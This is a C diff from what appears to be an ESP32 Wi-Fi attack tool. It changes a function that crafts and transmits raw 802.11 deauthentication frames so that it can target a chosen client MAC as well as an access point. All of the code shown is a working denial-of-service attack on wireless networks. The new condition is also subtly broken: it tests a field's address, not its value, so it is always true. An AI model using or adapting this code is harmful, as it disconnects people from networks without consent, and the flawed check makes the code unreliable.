@@ -47,12 +47,14 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
   ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
 }
 
-void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record) {
+void wsl_bypasser_send_deauth_frame(const attack_dos_config_t *attack_config) {
   ESP_LOGD(TAG, "Sending deauth frame...");
   uint8_t deauth_frame[sizeof(deauth_frame_default)];
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-  memcpy(&deauth_frame[10], ap_record->bssid, 6);
-  memcpy(&deauth_frame[16], ap_record->bssid, 6);
-
+  if (&attack_config->client_mac_specified) {
+    memcpy(&deauth_frame[4], attack_config->client_mac, 6);
+  }
+  memcpy(&deauth_frame[10], attack_config->ap_record->bssid, 6);
+  memcpy(&deauth_frame[16], attack_config->ap_record->bssid, 6);
   wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
